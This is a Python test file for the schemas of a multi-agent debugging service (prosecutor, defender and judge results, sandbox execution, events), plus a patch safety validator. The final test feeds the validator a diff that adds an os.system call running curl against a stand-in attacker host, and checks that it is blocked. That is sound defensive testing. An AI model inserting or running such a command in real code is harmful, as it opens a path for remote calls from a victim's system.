import pytest
from backend.schemas.session import Session, SessionCreateRequest, SessionResponse, RoundState
from backend.schemas.agents import ProsecutorResult, DefenderResult, JudgeResult, JudgeExecutionDetails
from backend.schemas.execution import ExecutionResult
from backend.schemas.events import DebugEvent
from backend.sandbox.patch_validator import PatchSafetyValidator


def test_session_schema_validation():
    session = Session(
        session_id="sess_12345",
        status="idle",
        bug_description="IndexError in slice_batch",
        test_command="pytest",
        current_round=1,
        max_rounds=3
    )
    assert session.session_id == "sess_12345"
    assert session.status == "idle"
    assert session.current_round == 1


def test_session_create_and_response_contracts():
    req = SessionCreateRequest(
        bug_description="Loop boundary error",
        test_command="pytest test_core.py",
        max_rounds=3
    )
    assert req.test_command == "pytest test_core.py"

    resp = SessionResponse(
        session_id="sess_abc",
        status="idle",
        bug_description=req.bug_description,
        test_command=req.test_command,
        current_round=1,
        max_rounds=req.max_rounds
    )
    assert resp.session_id == "sess_abc"


def test_prosecutor_result_schema():
    res = ProsecutorResult(
        root_cause="The loop iterates one position beyond the valid range.",
        evidence=[
            "range() uses len(items) + 1",
            "The failing test reports an IndexError"
        ],
        affected_files=["src/processor.py"],
        proposed_patch="--- a/src/processor.py\n+++ b/src/processor.py\n@@ ...",
        reasoning_summary="The extra iteration causes an out-of-range access."
    )
    assert "src/processor.py" in res.affected_files
    assert len(res.evidence) == 2


def test_defender_result_schema():
    res = DefenderResult(
        challenge="The loop boundary may not be the only issue.",
        alternative_hypothesis="The caller may pass an invalid batch size.",
        evidence=["batch_size is not validated before iteration"],
        affected_files=["src/processor.py"],
        proposed_patch="--- a/src/processor.py\n+++ b/src/processor.py\n@@ ...",
        reasoning_summary="The caller contract should also be validated."
    )
    assert "loop boundary" in res.challenge
    assert len(res.evidence) == 1


def test_execution_result_schema():
    exec_res = ExecutionResult(
        patch="A",
        status="passed",
        stdout="5 passed in 0.2s",
        stderr="",
        exit_code=0,
        tests_passed=5,
        tests_failed=0,
        duration_ms=210
    )
    assert exec_res.exit_code == 0
    assert exec_res.status == "passed"
    assert exec_res.patch == "A"
    assert isinstance(exec_res.duration_ms, int)


def test_judge_result_schema():
    exec_a = ExecutionResult(
        patch="A", status="failed", stdout="1 failed", stderr="FAILED", exit_code=1,
        tests_passed=4, tests_failed=1, duration_ms=380
    )
    exec_b = ExecutionResult(
        patch="B", status="passed", stdout="5 passed", stderr="", exit_code=0,
        tests_passed=5, tests_failed=0, duration_ms=410
    )

    judge = JudgeResult(
        decision="VERIFIED",
        winning_patch="B",
        reason="Patch B verified by actual sandbox pytest execution. All tests passed.",
        execution=JudgeExecutionDetails(patch_a=exec_a, patch_b=exec_b)
    )
    assert judge.decision == "VERIFIED"
    assert judge.winning_patch == "B"
    assert judge.execution.patch_a.tests_failed == 1
    assert judge.execution.patch_b.tests_passed == 5


def test_round_state_contract():
    round_state = RoundState(
        round_number=1,
        status="running"
    )
    assert round_state.round_number == 1
    assert round_state.status == "running"


def test_debug_event_contract():
    event = DebugEvent(
        event="agent_started",
        session_id="sess_024",
        round=1,
        agent="prosecutor",
        payload={"message": "Analyzing failure traces"}
    )
    assert event.event == "agent_started"
    assert event.agent == "prosecutor"
    assert event.round == 1


def test_patch_safety_validator_blocks_dangerous_code():
    safe_diff = "--- a/file.py\n+++ b/file.py\n+ return [x for x in items]"
    is_safe, _ = PatchSafetyValidator.validate_patch(safe_diff)
    assert is_safe is True

    unsafe_diff = "--- a/file.py\n+++ b/file.py\n+ import os; os.system('curl attacker.com')"
    is_safe, error_msg = PatchSafetyValidator.validate_patch(unsafe_diff)
    assert is_safe is False
    assert "restricted pattern" in error_msg
